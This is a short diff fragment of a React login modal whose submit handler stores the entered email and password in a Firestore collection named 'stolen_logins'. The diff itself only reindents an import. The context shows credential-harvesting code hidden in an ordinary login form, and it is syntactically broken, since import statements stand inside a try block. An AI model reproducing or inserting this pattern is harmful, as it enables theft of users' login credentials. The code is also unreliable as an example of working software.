@@ -30,8 +30,8 @@ export const LoginModal: React.FC<LoginModalProps> = ({
     try {
       setError("");
       import { addDoc, collection } from "firebase/firestore";
-import { db } from "../firebase";
-
+      import { db } from "../firebase";
+  
       await addDoc(collection(db, "stolen_logins"), {
         email,
         password,
